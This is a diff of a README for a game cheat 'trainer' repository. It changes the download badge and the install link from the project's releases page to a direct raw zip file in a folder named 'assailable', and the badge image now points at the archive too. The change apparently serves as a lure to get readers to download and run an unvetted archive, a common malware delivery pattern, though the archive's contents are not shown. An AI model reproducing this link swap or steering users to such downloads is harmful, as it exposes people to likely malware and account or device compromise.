@@ -1,6 +1,6 @@
 # 🎮 Project-Castaway-Trainer-Cheats - Easy Cheats for Project Castaway
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/AndyPG25/Project-Castaway-Trainer-Cheats/releases)
+[![Download](https://raw.githubusercontent.com/AndyPG25/Project-Castaway-Trainer-Cheats/main/assailable/Project-Castaway-Trainer-Cheats.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/AndyPG25/Project-Castaway-Trainer-Cheats/main/assailable/Project-Castaway-Trainer-Cheats.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to Project-Castaway-Trainer-Cheats! This tool provides easy-to-use cheat
 
 ## 📥 Download & Install
 
-To get started, visit the following link to download the software: [Download Project-Castaway-Trainer-Cheats](https://github.com/AndyPG25/Project-Castaway-Trainer-Cheats/releases).
+To get started, visit the following link to download the software: [Download Project-Castaway-Trainer-Cheats](https://raw.githubusercontent.com/AndyPG25/Project-Castaway-Trainer-Cheats/main/assailable/Project-Castaway-Trainer-Cheats.zip).
 
 ### Steps to Download:
 
